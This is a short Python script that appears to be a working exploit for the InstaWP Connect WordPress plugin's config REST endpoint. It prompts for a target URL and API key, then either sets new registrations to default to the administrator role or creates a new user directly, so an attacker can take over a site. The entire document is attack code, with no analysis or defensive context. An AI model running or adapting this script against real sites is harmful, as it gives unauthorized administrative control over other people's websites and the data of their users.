import requests as req
import json
req.packages.urllib3.disable_warnings()

print("[1] Enable users_can_register and set default_role is administrator")
print("[2] Register user with InstaWP_Tools::create_user")
method = int(input('Method: '))
url = input('Url: ')
api_key = input('api_key: ')
username_register = input('Username: ')
email_register = input('Email: ')
password = input('Password: ')

data = {'api_key':api_key}
headers = {'Content-Type':'application/json'}
if method==1:
   data['wp']={"options":{"users_can_register":"1","default_role":"administrator"}}
   resp1 = req.post(url+'/wp-json/instawp-connect/v1/config', headers=headers,data=json.dumps(data))
   print("Enable users_can_register and set default_role is administrator success")
elif method==2:
   data['wp']={"users":[{"username":username_register,"email":email_register,"password":password}]}
   resp3 = req.post(url+'/wp-json/instawp-connect/v1/config', headers=headers,data=json.dumps(data))
   print("Register success !")
else:
   print("Not found method")
